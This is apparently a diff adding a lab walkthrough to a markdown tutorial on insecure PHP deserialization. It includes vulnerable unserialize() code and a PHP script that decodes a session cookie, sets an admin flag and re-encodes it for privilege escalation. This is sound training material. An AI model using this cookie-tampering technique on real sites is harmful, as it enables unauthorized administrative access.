@@ -76,6 +76,82 @@ Consider a website that uses a serialized `User` object to store data about a us
 O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}
 ```
 
+The `isAdmin` attribute is an obvious point of interest. An attack could:
+1. Change the boolean value to `1`.
+2. Re-encode the object.
+3. Overwrite their current cookie with this modified value.
+
+In isolation, this has no effect. However, let's say the website uses this cookie to check whether the current user has access to certain administrative functionality:
+
+```php
+$user = unserialize($_COOKIE);
+if ($user->isAdmin === true) {
+// allow access to admin interface
+}
+```
+
+This vulnerable code would instantiate a `User` object based on the cookie data, including the attacker-modifed `isAdmin` attribute. At no point is the authenticity of the serialized object checked.
+
+This simple scenario is not common in the wild. However, editing an attribute value in this way demonstrates the first step towards accessing the massive amount of attack surface exposed by insecure deserialization.
+
+#### Lab: Modifying serialized objects
+
+> **Objective**: _This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete the user `carlos`. You can log in to your own account using the following credentials: `wiener:peter`._
+
+1. When we login as `wiener` our cookie looks like this:
+
+    ![](lab1_login_cookie.png)
+
+2. We can write a short script using a [PHP Online Compiler](https://www.programiz.com/php/online-compiler/) that will:
+    1. Decode the cookie.
+    2. Modify the desired value.
+    3. Encode the cookie.
+
+    ```php
+    <?php
+
+    # set the serialized cookie
+    $serialized_cookie = "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d";
+    print "Serialized cookie: $serialized_cookie\n\n";
+
+    # URL decode cookie
+    $url_decoded_cookie = urldecode($serialized_cookie);
+    print "URL decoded cookie: $url_decoded_cookie\n\n";
+
+    # Base64 decode cookie
+    $base64_decoded_cookie = base64_decode($url_decoded_cookie);
+    print "Base64 decoded cookie: $base64_decoded_cookie\n\n";
+
+    # modify attribute
+    $modified_cookie = 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}';
+
+    # modify attribute and encode cookie
+    $modifed_serialized_cookie = urlencode(base64_encode($modified_cookie));
+    print "Modified serialized cookie: $modifed_serialized_cookie";
+
+    ?>
+    ```
+
+    The output of the above script is the following:
+
+    ```text
+    Serialized cookie: Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d
+
+    URL decoded cookie: Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30=
+
+    Base64 decoded cookie: O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
+
+    Modified serialized cookie: Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3D
+    ```
+
+3.  Then, we can test the cookie via Burp's repeater, and if it works, then manually change it via the browser's **developer tools**, refresh the page and, hopefully, become admins:
+
+    ![](lab1_admin_panel.png)
+
+    ![](lab1_inspector_cookie.png)
+
+    ![](lab1_solved.png)
+
 ## Futher practice
 
 - [picoCTF: Super Serial](https://cspanias.github.io/posts/PicoCTF-Super-Serial/)
